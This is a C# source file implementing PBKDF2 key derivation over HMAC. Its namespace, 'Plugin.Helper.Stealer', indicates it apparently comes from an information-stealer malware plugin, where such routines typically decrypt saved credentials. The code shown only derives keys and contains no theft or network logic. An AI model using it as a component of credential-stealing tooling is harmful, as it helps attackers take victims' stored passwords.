

using System;
using System.Security.Cryptography;


namespace Plugin.Helper.Stealer
{
	public class PBKDF2
	{
		private int blockSize;
		private uint blockIndex = 1;
		private byte[] bufferBytes;
		private int bufferStartIndex;
		private int bufferEndIndex;
		private byte[] salt;
		private HMAC algo;
		private int interations;

		public PBKDF2(HMAC algo, byte[] password, byte[] salt, int interations)
		{
			algo.Key = password;
			this.algo = algo;
			this.salt = salt;
			this.blockSize = algo.HashSize / 8;
			this.interations = interations;
			this.bufferBytes = new byte[this.blockSize];
		}

		public byte[] ComputeHash(int keySize)
		{
			byte[] destinationArray = new byte[keySize];
			int destinationIndex = 0;
			int length1 = this.bufferEndIndex - this.bufferStartIndex;
			if (length1 > 0)
			{
				if (keySize < length1)
				{
					Array.Copy((Array) this.bufferBytes, this.bufferStartIndex, (Array) destinationArray, 0, keySize);
					this.bufferStartIndex += keySize;
					return destinationArray;
				}
				Array.Copy((Array) this.bufferBytes, this.bufferStartIndex, (Array) destinationArray, 0, length1);
				this.bufferStartIndex = 0;
				this.bufferEndIndex = 0;
				destinationIndex += length1;
			}
			for (; destinationIndex < keySize; destinationIndex += this.blockSize)
			{
				int length2 = keySize - destinationIndex;
				byte[] numArray = new byte[this.salt.Length + 4];
				Array.Copy((Array) this.salt, 0, (Array) numArray, 0, this.salt.Length);
				Array.Copy((Array) PBKDF2.GetBytesFromUInt(this.blockIndex), 0, (Array) numArray, this.salt.Length, 4);
				byte[] hash = this.algo.ComputeHash(numArray);
				this.bufferBytes = hash;
				for (int index1 = 2; index1 <= this.interations; ++index1)
				{
					hash = this.algo.ComputeHash(hash, 0, hash.Length);
					for (int index2 = 0; index2 < this.blockSize; ++index2)
						this.bufferBytes[index2] = (byte) ((uint) this.bufferBytes[index2] ^ (uint) hash[index2]);
				}
				if (this.blockIndex == uint.MaxValue)
					return (byte[]) null;
				++this.blockIndex;
				if (length2 > this.blockSize)
				{
					Array.Copy((Array) this.bufferBytes, 0, (Array) destinationArray, destinationIndex, this.blockSize);
				}
				else
				{
					Array.Copy((Array) this.bufferBytes, 0, (Array) destinationArray, destinationIndex, length2);
					this.bufferStartIndex = length2;
					this.bufferEndIndex = this.blockSize;
					break;
				}
			}
			return destinationArray;
		}

		private static byte[] GetBytesFromUInt(uint i)
		{
			byte[] bytes = BitConverter.GetBytes(i);
			if (BitConverter.IsLittleEndian)
				Array.Reverse((Array) bytes);
			return bytes;
		}
	}
}
